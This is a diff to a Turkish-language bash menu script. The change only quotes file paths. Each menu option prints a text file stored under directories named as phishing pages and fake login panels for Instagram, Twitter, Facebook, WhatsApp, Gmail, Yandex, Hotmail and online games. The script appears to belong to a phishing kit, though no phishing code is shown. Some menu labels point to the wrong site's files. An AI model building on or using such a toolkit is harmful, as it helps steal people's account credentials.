@@ -29,7 +29,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor.."
 sleep 2
 echo -e "\e[37m"
-cat Instagram/Instagram-phishing/username-phishing.txt
+cat "Instagram/Instagram-phishing/username-phishing.txt"
 
 elif [[ $islem == "insta02" ]]; then
 sleep 1
@@ -37,7 +37,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor..."
 sleep 2
 echo -e "\e[37m"
-cat Instagram/Instagram-fakepanel/username-fakepanel.txt
+cat "Instagram/Instagram-fakepanel/username-fakepanel.txt"
 
 elif [[ $islem == "twitter01" ]]; then
 sleep 1
@@ -45,7 +45,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor...."
 sleep 2
 echo -e "\e[37m"
-cat Twitter/Site-phishing/user.txt
+cat "Twitter/Site-phishing/user.txt"
 
 elif [[ $islem == "twitter02" ]]; then
 sleep 1
@@ -53,14 +53,14 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor."
 sleep 2
 echo -e "\e[37m"
-cat Twitter/Site-fakepanel/twitter.txt
+cat "Twitter/Site-fakepanel/twitter.txt"
 
 elif [[ $islem == "whatsapp" ]]; then
 sleep 1
 echo ""
 echo -e "\e[33mVeriler Yükleniyor.."
 echo -e "\e[37m"
-cat Whatsapp/Site/code.txt
+cat "Whatsapp/Site/code.txt"
 
 elif [[ $islem == "face01" ]]; then
 sleep 1
@@ -68,7 +68,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor..."
 sleep 2
 echo -e "\e[37m"
-cat Facebook/Site-facebook/facebook.txt
+cat "Facebook/Site-facebook/facebook.txt"
 
 elif [[ $islem == "face02" ]]; then
 sleep 1
@@ -76,14 +76,14 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor...."
 sleep 2
 echo -e "\e[37m"
-cat Facebook/Site-fakepanel/fakepanel.txt
+cat "Facebook/Site-fakepanel/fakepanel.txt"
 elif [[ $islem == "gmail" ]]; then
 sleep 1
 echo ""
 echo -e "\e[33mVeriler Yükleniyor."
 sleep 2
 echo -e "\e[37m"
-cat Mail/Site-gmail/gmail.txt
+cat "Mail/Site-gmail/gmail.txt"
 
 elif [[ $islem == "hotmail" ]]; then
 sleep 1
@@ -91,7 +91,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor.."
 sleep 2
 echo -e "\e[37m"
-cat Mail/Site-yandex/yandex.txt
+cat "Mail/Site-yandex/yandex.txt"
 
 elif [[ $islem == "yandex" ]]; then
 sleep 1
@@ -99,7 +99,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor..."
 sleep 2
 echo -e "\e[37m"
-cat Mail/Site-hotmail/hotmail.txt
+cat "Mail/Site-hotmail/hotmail.txt"
 
 elif [[ $islem == "zula" ]]; then
 sleep 1
@@ -107,7 +107,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor...."
 sleep 2
 echo -e "\e[37m"
-cat Game/Site-wolfteam/wolfteam.txt
+cat "Game/Site-wolfteam/wolfteam.txt"
 
 elif [[ $islem == "lol" ]]; then
 sleep 1
@@ -115,7 +115,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor."
 sleep 2
 echo -e "\e[37m"
-cat Game/Site-legend/legendonline.txt
+cat "Game/Site-legend/legendonline.txt"
 
 elif [[ $islem == "pubg" ]]; then
 sleep 1
@@ -123,7 +123,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor.."
 sleep 2
 echo -e "\e[37m"
-cat Game/Site-pubg/pubg.txt
+cat "Game/Site-pubg/pubg.txt"
 
 elif [[ $islem == "wolfteam" ]]; then
 sleep 1
@@ -131,7 +131,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor..."
 sleep 2
 echo -e "\e[37m"
-cat Game/Site-zula/zula.txt
+cat "Game/Site-zula/zula.txt"
 
 elif [[ $islem == "legend" ]]; then
 sleep 1
@@ -139,7 +139,7 @@ echo ""
 echo -e "\e[33mVeriler Yükleniyor...."
 sleep 2
 echo -e "\e[37m"
-cat Game/Site-lol/lol.txt
+cat "Game/Site-lol/lol.txt"
 
 if [[ $islem == "Q" || $islem == "q" ]]; then
 cd ..
